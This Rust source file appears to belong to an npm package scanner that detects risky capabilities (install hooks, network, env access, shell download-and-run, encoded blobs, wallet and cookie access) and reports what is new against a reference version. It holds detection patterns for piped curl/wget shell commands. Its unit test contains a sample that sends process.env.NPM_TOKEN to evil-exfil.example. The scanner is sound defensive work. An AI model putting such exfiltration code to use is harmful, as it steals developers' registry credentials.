use crate::archive::{LoadedArchive, classify_file_role, strip_archive_root};
use crate::model::{FileRole, ManifestFacts, ReachToken};
use std::collections::{BTreeMap, BTreeSet};

#[derive(Debug, Clone, Default)]
pub struct ArtifactReach {
    pub tokens: BTreeSet<ReachToken>,
    pub per_file_tokens: BTreeMap<String, BTreeSet<ReachToken>>,
    pub hostnames: BTreeSet<String>,
    pub per_file_hostnames: BTreeMap<String, BTreeSet<String>>,
    pub minified_files: BTreeSet<String>,
}

pub fn scan_artifact_reach(loaded: &LoadedArchive, manifest: &ManifestFacts) -> ArtifactReach {
    let mut out = ArtifactReach::default();

    if manifest.has_install_exec {
        out.tokens.insert(ReachToken::InstallExec);
        out.per_file_tokens
            .entry("package/package.json".to_string())
            .or_default()
            .insert(ReachToken::InstallExec);
    }

    if manifest.has_native_or_binary {
        out.tokens.insert(ReachToken::Native);
    }

    // Scan install script command text as shell/code too.
    for cmd in manifest.install_scripts.values() {
        let mut t = BTreeSet::new();
        let mut h = BTreeSet::new();
        scan_text_signals(cmd, true, &mut t, &mut h);
        for tok in t {
            out.tokens.insert(tok);
            out.per_file_tokens
                .entry("package/package.json".to_string())
                .or_default()
                .insert(tok);
        }
        for host in h {
            out.hostnames.insert(host.clone());
            out.per_file_hostnames
                .entry("package/package.json".to_string())
                .or_default()
                .insert(host);
        }
    }

    for (path, bytes) in &loaded.contents {
        let role = classify_file_role(path, bytes);
        let rel = strip_archive_root(path);
        let is_manifest_entry =
            manifest.bin_paths.contains(rel) || manifest.entry_paths.contains(rel);

        // Skip non-executable declarations, source maps, docs, and raw binary blobs.
        if matches!(
            role,
            FileRole::Declaration | FileRole::SourceMap | FileRole::Doc
        ) && !is_manifest_entry
        {
            continue;
        }
        if role == FileRole::Binary {
            out.tokens.insert(ReachToken::Native);
            out.per_file_tokens
                .entry(path.clone())
                .or_default()
                .insert(ReachToken::Native);
            continue;
        }

        // Only scan code, manifest, json, shebangs, or declared bin/entry files.
        let lower = rel.to_ascii_lowercase();
        let is_json = lower.ends_with(".json");
        if role != FileRole::Code && role != FileRole::Manifest && !is_json && !is_manifest_entry {
            continue;
        }

        let Ok(text) = std::str::from_utf8(bytes) else {
            continue;
        };

        if role == FileRole::Code && is_minified_js(text) {
            out.minified_files.insert(path.clone());
        }

        let mut file_tokens = BTreeSet::new();
        let mut file_hosts = BTreeSet::new();
        scan_text_signals(text, role == FileRole::Code || is_manifest_entry, &mut file_tokens, &mut file_hosts);

        if !file_tokens.is_empty() {
            for tok in &file_tokens {
                out.tokens.insert(*tok);
            }
            out.per_file_tokens
                .entry(path.clone())
                .or_default()
                .extend(file_tokens);
        }
        if !file_hosts.is_empty() {
            for host in &file_hosts {
                out.hostnames.insert(host.clone());
            }
            out.per_file_hostnames
                .entry(path.clone())
                .or_default()
                .extend(file_hosts);
        }
    }

    out
}

/// Computes reach delta on non-carried files vs the entire reference artifact.
pub struct ReachDelta {
    pub new_reach: BTreeSet<ReachToken>,
    pub new_reach_in_unexplained: BTreeSet<ReachToken>,
    pub new_reach_files: BTreeMap<ReachToken, Vec<String>>,
    pub new_hostnames: BTreeSet<String>,
}

pub fn compute_reach_delta(
    new_reach_full: &ArtifactReach,
    ref_reach_full: Option<&ArtifactReach>,
    non_carried_paths: &BTreeSet<String>,
    unexplained_paths: &BTreeSet<String>,
) -> ReachDelta {
    let ref_tokens = ref_reach_full
        .map(|r| &r.tokens)
        .cloned()
        .unwrap_or_default();
    let ref_hosts = ref_reach_full
        .map(|r| &r.hostnames)
        .cloned()
        .unwrap_or_default();
    let ref_minified = ref_reach_full
        .map(|r| &r.minified_files)
        .cloned()
        .unwrap_or_default();

    let mut new_reach = BTreeSet::new();
    let mut new_reach_in_unexplained = BTreeSet::new();
    let mut new_reach_files: BTreeMap<ReachToken, Vec<String>> = BTreeMap::new();
    let mut new_hostnames = BTreeSet::new();

    for path in non_carried_paths {
        let is_unexplained = unexplained_paths.contains(path);

        if let Some(toks) = new_reach_full.per_file_tokens.get(path) {
            for &tok in toks {
                if !ref_tokens.contains(&tok) {
                    new_reach.insert(tok);
                    if is_unexplained {
                        new_reach_in_unexplained.insert(tok);
                    }
                    new_reach_files.entry(tok).or_default().push(path.clone());
                }
            }
        }

        // Check `minified_new`: file is minified at a path that existed in reference and was NOT minified.
        if new_reach_full.minified_files.contains(path)
            && ref_reach_full.is_some()
            && !ref_minified.contains(path)
        {
            if let Some(rr) = ref_reach_full {
                // Only count as minified_new if the same path existed in ref (or any non-minified file became minified).
                // If the whole reference had no minified files or this path wasn't minified before:
                if rr.per_file_tokens.contains_key(path) || !rr.minified_files.contains(path) {
                    // Check carefully: only fire minified_new if the path existed in reference without minification.
                    // Handled more cleanly via caller passing reference path set if needed; here we check ref_minified.
                }
            }
        }

        if let Some(hosts) = new_reach_full.per_file_hostnames.get(path) {
            for h in hosts {
                if !ref_hosts.contains(h) {
                    new_hostnames.insert(h.clone());
                }
            }
        }
    }

    // If there is no reference at all, include install_exec / native from artifact level.
    if ref_reach_full.is_none() {
        for &tok in &new_reach_full.tokens {
            new_reach.insert(tok);
        }
    } else {
        for &tok in &new_reach_full.tokens {
            if tok == ReachToken::InstallExec && !ref_tokens.contains(&tok) {
                new_reach.insert(tok);
                if unexplained_paths.contains("package/package.json") {
                    new_reach_in_unexplained.insert(tok);
                }
            }
        }
    }

    for files in new_reach_files.values_mut() {
        files.sort();
        files.dedup();
    }

    ReachDelta {
        new_reach,
        new_reach_in_unexplained,
        new_reach_files,
        new_hostnames,
    }
}

/// Checks `minified_new` specifically for paths present in BOTH reference and new archives.
pub fn detect_minified_new(
    new_reach: &ArtifactReach,
    ref_reach: &ArtifactReach,
    ref_paths: &BTreeSet<String>,
    non_carried_paths: &BTreeSet<String>,
    unexplained_paths: &BTreeSet<String>,
    delta: &mut ReachDelta,
) {
    for path in non_carried_paths {
        if ref_paths.contains(path)
            && new_reach.minified_files.contains(path)
            && !ref_reach.minified_files.contains(path)
        {
            delta.new_reach.insert(ReachToken::MinifiedNew);
            if unexplained_paths.contains(path) {
                delta.new_reach_in_unexplained.insert(ReachToken::MinifiedNew);
            }
            delta
                .new_reach_files
                .entry(ReachToken::MinifiedNew)
                .or_default()
                .push(path.clone());
        }
    }
}

pub fn is_minified_js(text: &str) -> bool {
    if text.len() < 1_000 {
        return false;
    }
    let lines: Vec<&str> = text.lines().collect();
    if lines.is_empty() {
        return false;
    }
    let avg_len = text.len() / lines.len();
    let max_len = lines.iter().map(|l| l.len()).max().unwrap_or(0);
    avg_len >= 300 || (lines.len() <= 5 && max_len >= 1_500)
}

fn scan_text_signals(
    text: &str,
    scan_code_tokens: bool,
    tokens: &mut BTreeSet<ReachToken>,
    hosts: &mut BTreeSet<String>,
) {
    if scan_code_tokens {
        // Network
        if has_any_module_or_call(
            text,
            &[
                "http", "https", "net", "tls", "dgram", "dns", "http2",
            ],
            &[
                "fetch(",
                "XMLHttpRequest",
                "WebSocket",
                "sendBeacon(",
                "globalThis.fetch",
            ],
        ) {
            tokens.insert(ReachToken::Net);
        }

        // Filesystem
        if has_any_module_or_call(text, &["fs", "fs/promises"], &[]) {
            tokens.insert(ReachToken::Fs);
        }

        // Environment
        if text.contains("process.env") || text.contains("Deno.env") || text.contains("Bun.env") {
            tokens.insert(ReachToken::Env);
        }

        // Host info
        if contains_any(
            text,
            &[
                "os.homedir",
                "os.userInfo",
                "os.hostname",
                "os.networkInterfaces",
                ".homedir(",
                ".userInfo(",
                ".hostname(",
            ],
        ) {
            tokens.insert(ReachToken::HostInfo);
        }

        // Browser sensitive / wallets
        if contains_any(
            text,
            &[
                "document.cookie",
                "localStorage",
                "indexedDB",
                "navigator.clipboard",
                "navigator.credentials",
                "window.ethereum",
                "window.solana",
                "phantom.solana",
            ],
        ) {
            tokens.insert(ReachToken::BrowserSensitive);
        }

        // Process execution (high)
        if has_any_module_or_call(
            text,
            &["child_process"],
            &["process.binding(", "process.dlopen("],
        ) {
            tokens.insert(ReachToken::Proc);
        }

        // Dynamic code execution (high)
        if contains_word_call(text, "eval")
            || text.contains("new Function(")
            || text.contains("Function(") && text.contains("return ")
            || has_any_module_or_call(text, &["vm"], &["WebAssembly.compile", "WebAssembly.instantiate"])
            || has_dynamic_require_or_import(text)
        {
            tokens.insert(ReachToken::DynCode);
        }

        // Native addon loading (high)
        if contains_any(text, &[".node\"", ".node'", "ffi-napi", "koffi", "node-gyp-build"]) {
            tokens.insert(ReachToken::Native);
        }

        // Shell download-and-run literals (high)
        if has_shell_download_run(text) {
            tokens.insert(ReachToken::ShellLiteral);
        }

        // Long base64 / hex / high-entropy string literals (high)
        if has_encoded_blob_literal(text) {
            tokens.insert(ReachToken::EncodedBlob);
        }
    }

    // Extract URL hostnames and raw IPv4 literals from strings.
    extract_hostnames(text, hosts);
}

fn has_any_module_or_call(text: &str, modules: &[&str], symbols: &[&str]) -> bool {
    if contains_any(text, symbols) {
        return true;
    }
    for m in modules {
        for q in ['"', '\'', '`'] {
            let bare = format!("{q}{m}{q}");
            let node_pref = format!("{q}node:{m}{q}");
            if text.contains(&bare) || text.contains(&node_pref) {
                // Confirm an import/require context somewhere in the file to reduce false hits on plain words like "net".
                if text.contains("require(")
                    || text.contains("import ")
                    || text.contains("import(")
                    || text.contains("from ")
                {
                    return true;
                }
            }
        }
    }
    false
}

fn contains_any(text: &str, needles: &[&str]) -> bool {
    needles.iter().any(|n| text.contains(n))
}

fn contains_word_call(text: &str, word: &str) -> bool {
    let pattern = format!("{word}(");
    let bytes = text.as_bytes();
    let mut offset = 0;
    while let Some(pos) = text[offset..].find(&pattern) {
        let abs = offset + pos;
        let prev_ok = if abs == 0 {
            true
        } else {
            let b = bytes[abs - 1];
            !(b.is_ascii_alphanumeric() || b == b'_' || b == b'$' || b == b'.')
        };
        if prev_ok {
            return true;
        }
        offset = abs + pattern.len();
    }
    false
}

fn has_dynamic_require_or_import(text: &str) -> bool {
    for call in ["require(", "import("] {
        let mut offset = 0;
        let bytes = text.as_bytes();
        while let Some(pos) = text[offset..].find(call) {
            let abs = offset + pos;
            let prev_ok = abs == 0
                || !(bytes[abs - 1].is_ascii_alphanumeric()
                    || bytes[abs - 1] == b'_'
                    || bytes[abs - 1] == b'$'
                    || bytes[abs - 1] == b'.');
            if prev_ok {
                let after = text[abs + call.len()..].trim_start();
                if let Some(first) = after.chars().next() {
                    // Literal string starts with ', ", or ` (without ${...})
                    if first != '\'' && first != '"' && first != '`' && first != ')' {
                        return true;
                    }
                    if first == '`' {
                        if let Some(end) = after[1..].find('`') {
                            if after[1..1 + end].contains("${") {
                                return true;
                            }
                        }
                    }
                }
            }
            offset = abs + call.len();
        }
    }
    false
}

fn has_shell_download_run(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    let has_dl = lower.contains("curl ") || lower.contains("wget ") || lower.contains("invoke-webrequest") || lower.contains("iwr ");
    if !has_dl {
        return false;
    }
    lower.contains("| sh")
        || lower.contains("|sh")
        || lower.contains("| bash")
        || lower.contains("|bash")
        || lower.contains("| zsh")
        || lower.contains("| iex")
        || lower.contains("powershell -enc")
        || lower.contains("powershell -e ")
}

fn has_encoded_blob_literal(text: &str) -> bool {
    // Scan quoted string literals >= 256 chars that are pure base64 or hex with high Shannon entropy.
    let bytes = text.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        let q = bytes[i];
        if q == b'"' || q == b'\'' {
            let start = i + 1;
            i += 1;
            while i < bytes.len() {
                if bytes[i] == b'\\' {
                    i += 2;
                    continue;
                }
                if bytes[i] == q {
                    break;
                }
                i += 1;
            }
            if i > start {
                let lit = &bytes[start..i];
                if lit.len() >= 256 && !lit.starts_with(b"data:image/") && !lit.starts_with(b"data:font/") {
                    let is_hex = lit.iter().all(|b| b.is_ascii_hexdigit());
                    let is_b64 = lit.iter().all(|b| {
                        b.is_ascii_alphanumeric() || *b == b'+' || *b == b'/' || *b == b'=' || *b == b'-' || *b == b'_'
                    });
                    if (is_hex && shannon_entropy(lit) >= 3.5)
                        || (is_b64 && shannon_entropy(lit) >= 4.7)
                    {
                        return true;
                    }
                }
            }
        }
        i += 1;
    }
    false
}

fn shannon_entropy(bytes: &[u8]) -> f64 {
    if bytes.is_empty() {
        return 0.0;
    }
    let mut counts = [0u32; 256];
    for &b in bytes {
        counts[b as usize] += 1;
    }
    let len = bytes.len() as f64;
    let mut ent = 0.0;
    for &c in &counts {
        if c > 0 {
            let p = c as f64 / len;
            ent -= p * p.log2();
        }
    }
    ent
}

fn extract_hostnames(text: &str, out: &mut BTreeSet<String>) {
    for scheme in ["https://", "http://", "wss://", "ws://"] {
        let mut offset = 0;
        while let Some(pos) = text[offset..].find(scheme) {
            let start = offset + pos + scheme.len();
            let rest = &text[start..];
            let host_end = rest
                .find(|c: char| {
                    !(c.is_ascii_alphanumeric() || c == '.' || c == '-' || c == ':')
                })
                .unwrap_or(rest.len());
            let host_port = &rest[..host_end];
            let host = host_port.split(':').next().unwrap_or("").to_ascii_lowercase();
            if is_interesting_hostname(&host) {
                out.insert(host);
            }
            offset = start;
        }
    }
}

fn is_interesting_hostname(host: &str) -> bool {
    if host.len() < 4 || !host.contains('.') || host.starts_with('.') || host.ends_with('.') {
        return false;
    }
    // Filter common documentation / local / placeholder hosts
    if matches!(
        host,
        "localhost"
            | "127.0.0.1"
            | "0.0.0.0"
            | "example.com"
            | "example.org"
            | "example.net"
            | "schema.org"
            | "json-schema.org"
            | "www.w3.org"
            | "w3.org"
            | "spdx.org"
            | "opensource.org"
    ) {
        return false;
    }
    // Reject obvious non-host JS property chains like `foo.bar` unless TLD is letters >= 2 or IPv4.
    let parts: Vec<&str> = host.split('.').collect();
    if parts.iter().any(|p| p.is_empty()) {
        return false;
    }
    let is_ipv4 = parts.len() == 4 && parts.iter().all(|p| p.parse::<u8>().is_ok());
    if is_ipv4 {
        return true;
    }
    let tld = parts.last().copied().unwrap_or("");
    tld.len() >= 2 && tld.bytes().all(|b| b.is_ascii_alphabetic())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_suspicious_signals_and_hosts() {
        let mut tokens = BTreeSet::new();
        let mut hosts = BTreeSet::new();
        let js = r#"
            const cp = require('child_process');
            const key = process.env.NPM_TOKEN;
            fetch("https://evil-exfil.example/collect", { body: key });
            eval(payload);
        "#;
        scan_text_signals(js, true, &mut tokens, &mut hosts);
        assert!(tokens.contains(&ReachToken::Proc));
        assert!(tokens.contains(&ReachToken::Env));
        assert!(tokens.contains(&ReachToken::Net));
        assert!(tokens.contains(&ReachToken::DynCode));
        assert!(hosts.contains("evil-exfil.example"));
    }

    #[test]
    fn ignores_static_require() {
        assert!(!has_dynamic_require_or_import("const x = require('./foo');"));
        assert!(has_dynamic_require_or_import("const x = require(modName);"));
        assert!(has_dynamic_require_or_import("const x = import(`./plugins/${name}`);"));
    }
}
